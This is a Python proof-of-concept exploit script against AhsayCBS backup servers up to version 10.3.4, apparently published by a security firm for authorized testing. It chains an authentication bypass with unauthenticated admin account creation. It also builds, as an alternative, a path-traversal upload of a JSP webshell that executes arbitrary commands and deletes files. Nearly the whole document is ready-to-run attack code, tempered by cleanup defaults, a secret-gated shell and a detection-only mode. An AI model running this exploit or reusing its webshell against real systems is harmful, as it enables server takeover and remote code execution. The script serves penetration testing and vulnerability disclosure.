#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# AhsayCBS <= 10.3.4 unauthenticated takeover  (CVE-2026-105133 + CVE-2026-105134)
#
#   CVE-2026-105133  com.ahsay.obs.api.json.JSONApi.execute() skips checkSysPwd()
#                    when the JSON body carries {"FromServlet":"Y"} -> every JSON API
#                    action becomes reachable with no credentials.
#
# Two primitives are built on that bypass:
#
#   [default]  ADMIN TAKEOVER (license-independent, works on any AhsayCBS)
#       com.ahsay.obs.api.json.system.systemUser.AddSysUser never checks the (null)
#       bypassed caller and creates a system user from attacker JSON. Creating a
#       Role=ADMIN account yields full web-console / admin-API control.
#
#   [--replication]  RCE via the Replication (RPS) receiver  (CVE-2026-105134)
#       Requires the target to be LICENSED/configured as a replication receiver
#       (otherwise mW.l()==true forces ReplicationEnabled=false and the upload 412s).
#       An auth-bypassed /rps/api/json/UpdateReceivers.do creates a receiver; the
#       replicated-file service (PUT /rps/obs7/rpsfile/upload) then builds its write
#       path from attacker "UserHome"/"TopDir" headers via getReplicatedPath() WITHOUT
#       the com.ahsay.c denylist. UserHome "../../webapps/<app>" traverses a JSP into a
#       web-served Tomcat dir -> code execution as the service account (SYSTEM / root).
#
# Safety / responsible use:
#   * The admin account and the (always auth-gated) webshell are REMOVED after every
#     run. Use --no-cleanup to intentionally keep them.
#   * The dropped webshell requires a per-run random secret, so it never leaves an
#     unauthenticated RCE backdoor on the target.
#
# Authorized security testing only.  Horizon3.ai

import argparse
import base64
import secrets
import string
import sys

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    sys.exit('[-] missing dependency: pip install requests')


# --------------------------------------------------------------------------- #
#  output decorators                                                          #
# --------------------------------------------------------------------------- #
_TTY = sys.stdout.isatty()


def _c(code):
    return code if _TTY else ''


RESET, BLUE, GREEN, RED, YELLOW, BOLD = (
    _c('\033[0m'), _c('\033[94m'), _c('\033[92m'),
    _c('\033[91m'), _c('\033[93m'), _c('\033[1m'))


def info(m): print(f'{BLUE}[*]{RESET} {m}')
def good(m): print(f'{GREEN}[+]{RESET} {m}')
def bad(m):  print(f'{RED}[-]{RESET} {m}')
def warn(m): print(f'{YELLOW}[!]{RESET} {m}')


# --------------------------------------------------------------------------- #
#  helpers                                                                     #
# --------------------------------------------------------------------------- #
def rand(n=8):
    return ''.join(secrets.choice(string.ascii_lowercase) for _ in range(n))


def gen_password(n=18):
    pools = [string.ascii_uppercase, string.ascii_lowercase, string.digits, '!@#$%*-_']
    pw = [secrets.choice(p) for p in pools]
    allc = ''.join(pools)
    pw += [secrets.choice(allc) for _ in range(n - len(pw))]
    secrets.SystemRandom().shuffle(pw)
    return ''.join(pw)


def jbypass(session, url, webapp, action, payload, timeout):
    """POST a /<webapp>/api/json/<action>.do with the FromServlet auth bypass."""
    body = {'FromServlet': 'Y', 'SysUser': 'x', 'SysPwd': 'x'}
    body.update(payload)
    return session.post(f'{url}/{webapp}/api/json/{action}.do', json=body, timeout=timeout)


def ok(resp):
    return '"Status":"OK"' in resp.text


# --------------------------------------------------------------------------- #
#  detection                                                                   #
# --------------------------------------------------------------------------- #
def check(session, url, timeout):
    """Non-invasive detection of CVE-2026-105133 (writes nothing)."""
    info('Checking authentication bypass (CVE-2026-105133)...')
    try:
        enforced = session.post(f'{url}/obs/api/json/ListSystemUsers.do',
                                json={}, timeout=timeout)
        bypass = session.post(f'{url}/obs/api/json/ListSystemUsers.do',
                              json={'FromServlet': 'Y'}, timeout=timeout)
    except requests.RequestException as e:
        bad(f'Request failed: {e}')
        return False
    if 'SysUser' in enforced.text and ok(bypass):
        good('Target is VULNERABLE: auth check is skipped with FromServlet=Y')
        return True
    if ok(bypass):
        good('Target appears VULNERABLE: unauthenticated API access succeeded')
        return True
    bad('Target does not appear vulnerable (auth was enforced).')
    return False


# --------------------------------------------------------------------------- #
#  PRIMITIVE A — unauthenticated admin takeover (default)                      #
# --------------------------------------------------------------------------- #
def exploit_admin(session, url, args):
    login = args.admin_user or 'svc_' + rand(6)
    password = args.admin_pass or gen_password()
    role = args.role
    created = False
    try:
        info(f'Creating {role} account {login!r} via AddSysUser (unauthenticated)...')
        r = jbypass(session, url, 'obs', 'AddSysUser',
                    {'LoginName': login, 'Password': password, 'Role': role}, args.timeout)
        if not ok(r):
            bad(f'AddSysUser failed: HTTP {r.status_code} {r.text.strip()[:200]}')
            return False
        created = True
        good(f'Created system user {login!r} (Role={role})')

        # prove it is a real, working admin: authenticate with the NEW creds (no bypass)
        v = session.post(f'{url}/obs/api/json/ListSystemUsers.do',
                         json={'SysUser': login, 'SysPwd': password}, timeout=args.timeout)
        if ok(v):
            good('Confirmed: the account authenticates as a functional ADMIN')
        else:
            warn('Account created but authentication check was inconclusive')

        print()
        good(f'{BOLD}Admin credentials{RESET}')
        print(f'      Console : {url}/cbs/')
        print(f'      Username: {login}')
        print(f'      Password: {password}')
        print(f'      Role    : {role}')
        print()
        return True
    finally:
        if args.no_cleanup:
            if created:
                warn(f'--no-cleanup set; leaving admin account {login!r} on the target')
        elif created:
            info('Cleaning up...')
            rm = jbypass(session, url, 'obs', 'RemoveSysUser',
                         {'RemoveLoginName': login}, args.timeout)
            if ok(rm):
                good(f'Removed admin account {login!r}')
            else:
                warn(f'Could not remove {login!r}; delete it manually (RemoveSysUser).')


# --------------------------------------------------------------------------- #
#  PRIMITIVE B — replication traversal webshell (--replication)               #
# --------------------------------------------------------------------------- #
# IRequestMeta$MetaData header ordinals -> X-RSW-Request-<ordinal>
H_USERNAME, H_HASHPWD, H_TOPDIR = 'X-RSW-Request-0', 'X-RSW-Request-1', 'X-RSW-Request-2'
H_STARTTIME, H_USERHOME = 'X-RSW-Request-8', 'X-RSW-Request-11'
H_ISSYSFILE, H_ISCOMPRESSED, H_ISLINUX = 'X-RSW-Request-12', 'X-RSW-Request-13', 'X-RSW-Request-14'


def b64(s):
    return base64.b64encode(s.encode('utf-8')).decode('ascii')


def jsp_webshell(secret):
    # Auth-gated: without ?auth=<secret> every request gets a 404. Supports
    # cmd=<command>, del=<path>, rm=1 (self-delete).
    return (
        '<%@ page import="java.util.*,java.io.*"%>\n'
        '<%!\n'
        '  void rmrf(File f){ if(f==null) return; if(f.isDirectory()){ File[] k=f.listFiles();'
        ' if(k!=null) for(File c:k) rmrf(c);} f.delete(); }\n'
        '%>\n'
        '<%\n'
        '  String SECRET = "' + secret + '";\n'
        '  if (!SECRET.equals(request.getParameter("auth"))) { response.sendError(404); return; }\n'
        '  out.println("<pre>");\n'
        '  String cmd = request.getParameter("cmd");\n'
        '  if (cmd != null) {\n'
        '    boolean win = System.getProperty("os.name").toLowerCase().contains("win");\n'
        '    String[] cc = win ? new String[]{"cmd.exe","/c",cmd} : new String[]{"/bin/sh","-c",cmd};\n'
        '    Process p = Runtime.getRuntime().exec(cc);\n'
        '    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));\n'
        '    String l; while ((l=r.readLine())!=null) out.println(l);\n'
        '    BufferedReader e = new BufferedReader(new InputStreamReader(p.getErrorStream()));\n'
        '    while ((l=e.readLine())!=null) out.println(l);\n'
        '  }\n'
        '  String del = request.getParameter("del");\n'
        '  if (del != null) { try { rmrf(new File(del)); out.println("[deleted] "+del); }\n'
        '                     catch (Exception ex) { out.println("[del-error] "+ex); } }\n'
        '  if ("1".equals(request.getParameter("rm"))) {\n'
        '    try { String self = application.getRealPath(request.getServletPath());\n'
        '          if (self != null) new File(self).delete(); out.println("[self-removed]"); }\n'
        '    catch (Exception ex) { out.println("[rm-error] "+ex); }\n'
        '  }\n'
        '  out.println("</pre>");\n'
        '%>\n')


def create_receiver(session, url, install_root, timeout):
    login, password = 'r' + rand(6), rand(16)
    sep = '\\' if (':' in install_root and '/' not in install_root) else '/'
    recv_dir = 'rpsrecv_' + rand(6)
    system_home = install_root.rstrip('/\\') + sep + recv_dir
    payload = {
        'Id': 0, 'ReplicationEnabled': True, 'LoginName': login, 'Password': password,
        'Alias': 'sys', 'SystemHome': system_home, 'ObsVersion': 1,
        'RestorePointInterval': 0, 'RetentionCustomizationPolicy': 0,
        'CrcEnabled': False, 'CrcHour': 0, 'CrcMinute': 0,
        'V6ReplicationEnabled': False, 'MigrateFromV6': False,
        'ListenHost': '', 'ListenPort': 0,
    }
    r = jbypass(session, url, 'rps', 'UpdateReceivers', payload, timeout)
    if not ok(r):
        bad(f'Receiver creation failed: HTTP {r.status_code} {r.text.strip()[:200]}')
        return None
    good(f'Created replication receiver {login!r} (SystemHome={system_home})')
    return {'login': login, 'password': password, 'system_home': system_home, 'id': None}


def receiver_id(session, url, login, timeout):
    r = jbypass(session, url, 'rps', 'ListReceiver', {}, timeout)
    try:
        for rc in r.json().get('Data', []):
            if rc.get('LoginName') == login:
                return rc.get('Id')
    except ValueError:
        pass
    return None


def upload_webshell(session, url, recv, webapp, shell_name, secret, timeout):
    user_home = f'../../webapps/{webapp}'
    payload = jsp_webshell(secret).encode('utf-8')
    headers = {
        'Content-Type': 'application/octet-stream',
        H_USERNAME: b64(recv['login']), H_HASHPWD: b64(recv['password']),
        H_TOPDIR: b64(user_home), H_USERHOME: b64(user_home),
        H_STARTTIME: b64('0'), H_ISSYSFILE: b64('false'),
        H_ISCOMPRESSED: b64('false'), H_ISLINUX: b64('false'),
        'X-RSW-custom-encode-path': b64(shell_name),
        'X-RSW-custom-encode-size': b64(str(len(payload))),
        'X-RSW-custom-encode-includeChecksum': b64('false'),
        'X-RSW-custom-encode-includeLastModified': b64('false'),
    }
    r = session.put(f'{url}/rps/obs7/rpsfile/upload', data=payload, headers=headers, timeout=timeout)
    if r.status_code in (200, 201, 204):
        good(f'Uploaded webshell -> /{webapp}/{shell_name} (auth-gated)')
        return True
    if r.status_code == 412:
        bad('Upload rejected (HTTP 412): the target is NOT a replication receiver '
            '(mW.l() gate / unlicensed for the RPS role). Primitive B needs a licensed '
            'replication receiver; the default admin-takeover mode works regardless.')
    else:
        bad(f'Upload failed: HTTP {r.status_code}')
    return False


def shell_get(session, url, webapp, shell_name, secret, params, timeout):
    q = {'auth': secret}
    q.update(params)
    return session.get(f'{url}/{webapp}/{shell_name}', params=q, timeout=timeout)


def run_command(session, url, webapp, shell_name, secret, cmd, timeout):
    r = shell_get(session, url, webapp, shell_name, secret, {'cmd': cmd}, timeout)
    if r.status_code != 200 or '<pre>' not in r.text:
        bad(f'Webshell did not execute (HTTP {r.status_code})')
        return None
    return r.text.split('<pre>', 1)[1].split('</pre>', 1)[0].strip()


def exploit_replication(session, url, args):
    secret = args.secret or secrets.token_hex(16)
    shell_name = args.shell_name or f'status_{rand(6)}.jsp'
    recv = None
    try:
        recv = create_receiver(session, url, args.install_root, args.timeout)
        if not recv:
            return False
        recv['id'] = receiver_id(session, url, recv['login'], args.timeout)
        if not upload_webshell(session, url, recv, args.webapp, shell_name, secret, args.timeout):
            return False
        info(f'Webshell: {url}/{args.webapp}/{shell_name}?auth={secret}')
        out = run_command(session, url, args.webapp, shell_name, secret, 'id || whoami', args.timeout)
        if out is None:
            return False
        good('Remote code execution confirmed:')
        for line in out.splitlines():
            print(f'      {line}')
        if args.cmd:
            info(f'Running: {args.cmd}')
            print((run_command(session, url, args.webapp, shell_name, secret,
                               args.cmd, args.timeout) or '').rstrip())
        return True
    finally:
        if args.no_cleanup:
            warn('--no-cleanup set; leaving artifacts in place:')
            if recv:
                warn(f'    receiver {recv["login"]!r}  home {recv["system_home"]}')
            warn(f'    webshell /{args.webapp}/{shell_name}?auth={secret}')
        else:
            info('Cleaning up...')
            if recv:
                try:
                    shell_get(session, url, args.webapp, shell_name, secret,
                              {'del': recv['system_home']}, args.timeout)
                except requests.RequestException:
                    pass
            try:
                shell_get(session, url, args.webapp, shell_name, secret, {'rm': '1'}, args.timeout)
                good(f'Removed webshell /{args.webapp}/{shell_name}')
            except requests.RequestException:
                warn('Could not confirm webshell removal')
            if recv:
                rid = recv.get('id') or receiver_id(session, url, recv['login'], args.timeout)
                if rid is not None:
                    jbypass(session, url, 'rps', 'RemoveReceiver', {'Id': rid}, args.timeout)
                    good(f'Removed receiver {recv["login"]!r} (Id={rid})')
                else:
                    warn('Receiver Id not found; remove manually via RemoveReceiver.do')


# --------------------------------------------------------------------------- #
def main():
    p = argparse.ArgumentParser(
        description='AhsayCBS <=10.3.4 unauthenticated takeover '
                    '(CVE-2026-105133 + CVE-2026-105134)')
    p.add_argument('-u', '--url', required=True, help='Target base URL, e.g. https://10.0.18.50')
    p.add_argument('--check', action='store_true',
                   help='Only test the auth bypass; do not write anything')
    p.add_argument('--no-cleanup', action='store_true',
                   help='Leave created account / webshell / receiver in place')
    p.add_argument('-k', '--insecure', action='store_true', default=True,
                   help='Ignore TLS certificate errors (default: on)')
    p.add_argument('-t', '--timeout', type=int, default=30, help='HTTP timeout (s)')

    a = p.add_argument_group('admin takeover (default primitive)')
    a.add_argument('--admin-user', default=None, help='Admin username to create (default: random)')
    a.add_argument('--admin-pass', default=None, help='Admin password (default: random strong)')
    a.add_argument('--role', default='ADMIN', help='System user role (default: ADMIN)')

    b = p.add_argument_group('replication RCE (--replication)')
    b.add_argument('--replication', action='store_true',
                   help='Use the replication webshell RCE instead of admin takeover '
                        '(target must be a licensed replication receiver)')
    b.add_argument('-c', '--cmd', default=None, help='Command to run via the webshell')
    b.add_argument('-r', '--install-root', default='/opt/AhsayCBS',
                   help=r'AhsayCBS install dir (parent of webapps/). '
                        r'default /opt/AhsayCBS  (Windows e.g. C:\AhsayCBS)')
    b.add_argument('-w', '--webapp', default='rps', help='Web app to drop the JSP into (default: rps)')
    b.add_argument('--secret', default=None, help='Webshell auth secret (default: random)')
    b.add_argument('--shell-name', default=None, help='Webshell filename (default: random)')
    args = p.parse_args()

    url = args.url.rstrip('/')
    session = requests.Session()
    session.verify = not args.insecure
    session.headers.update({'User-Agent': 'Mozilla/5.0'})

    print(f'{BOLD}AhsayCBS <=10.3.4 unauthenticated takeover '
          f'(CVE-2026-105133 + CVE-2026-105134){RESET}')
    info(f'Target: {url}')

    if not check(session, url, args.timeout):
        sys.exit(1)
    if args.check:
        return

    if args.replication:
        mode, done = 'replication RCE', exploit_replication(session, url, args)
    else:
        mode, done = 'admin takeover', exploit_admin(session, url, args)

    if done:
        good('Done.')
    else:
        bad(f'{mode} did not complete.')
        sys.exit(2)


if __name__ == '__main__':
    main()
